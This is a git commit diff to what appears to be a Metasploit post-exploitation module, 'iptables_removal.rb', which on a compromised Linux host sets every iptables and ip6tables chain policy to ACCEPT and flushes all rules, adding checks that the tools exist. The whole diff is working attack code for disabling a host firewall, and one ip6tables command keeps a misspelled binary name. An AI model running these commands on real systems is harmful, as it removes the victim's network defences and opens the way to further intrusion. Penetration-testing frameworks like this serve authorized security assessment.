259b92a64b60f1a2957d21dc758fb3ae9ff35af6
AlbertoCoding <albertocysec@gmail.com>
2018-08-14 18:24:15 +0200

    iptables_removal.rb module added

--- modules/post/linux/manage/iptables_removal.rb
+++ modules/post/linux/manage/iptables_removal.rb
@@ -21,24 +21,32 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    print_good("Deleting IPTABLES rules...")
-    cmd_exec("iptables -P INPUT ACCEPT")    
-    cmd_exec("iptables -P FORWARD ACCEPT")
-    cmd_exec("iptables -P OUTPUT ACCEPT")
-    cmd_exec("iptables -t nat -F")
-    cmd_exec("iptable -t mangle -F")
-    cmd_exec("iptables -F")
-    cmd_exec("iptables -X")
 
-    print_good("Deleting IP6TABLES rules...")
-    cmd_exec("ip6tables -P INPUT ACCEPT")
-    cmd_exec("ip6tables -P FORWARD ACCEPT")
-    cmd_exec("ip6tables -P OUTPUT ACCEPT")
-    cmd_exec("ip6tables -t nat -F")
-    cmd_exec("ip6table -t mangle -F")
-    cmd_exec("ip6tables -F")
-    cmd_exec("ip6tables -X")
-
-    print_good("Module successfully executed.")
+    if command_exists?("iptables")
+      print_good("Deleting IPTABLES rules...")
+      cmd_exec("iptables -P INPUT ACCEPT")
+      cmd_exec("iptables -P FORWARD ACCEPT")
+      cmd_exec("iptables -P OUTPUT ACCEPT")
+      cmd_exec("iptables -t nat -F")
+      cmd_exec("iptables -t mangle -F")
+      cmd_exec("iptables -F")
+      cmd_exec("iptables -X")
+      print_good("iptables rules successfully executed")
+    else
+      print_line("iptables rules could not be executed")
+    end
+    if command_exists?("ip6tables")
+      print_good("Deleting IP6TABLES rules...")
+      cmd_exec("ip6tables -P INPUT ACCEPT")
+      cmd_exec("ip6tables -P FORWARD ACCEPT")
+      cmd_exec("ip6tables -P OUTPUT ACCEPT")
+      cmd_exec("ip6tables -t nat -F")
+      cmd_exec("ip6table -t mangle -F")
+      cmd_exec("ip6tables -F")
+      cmd_exec("ip6tables -X")
+      print_good("ip6tables rules successfully executed")
+    else
+      print_line("ip6tables rules could not be executed")
+    end
   end
 end
